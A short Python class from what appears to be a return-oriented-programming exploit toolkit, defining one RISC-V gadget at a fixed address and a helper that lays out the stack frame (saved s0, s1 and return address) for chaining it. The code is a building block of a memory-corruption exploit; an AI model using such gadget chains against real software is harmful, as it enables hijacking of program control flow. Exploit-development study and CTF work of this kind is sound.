from bf_parser.rop_gadgets_base_class import ROP_Gadget

class MOVA4_A3(ROP_Gadget):
    '''
    mv a4, a3
    beqz a3, 0x15380
    ld ra, 0x38(sp)
    ld s0, 0x30(sp)
    ld s1, 0x28(sp)
    mv a0, a5
    addi sp, sp, 0x40
    jr ra
    '''
    def __init__(self):
        super().__init__(0x1536a, 0x40)

    def construct_frame(self, ra=0, s0=0, s1=0):
        data = [0, 0, 0, 0, 0, s1, s0, ra]
        self.set_stack_frame(data)
        return self.print_gadget()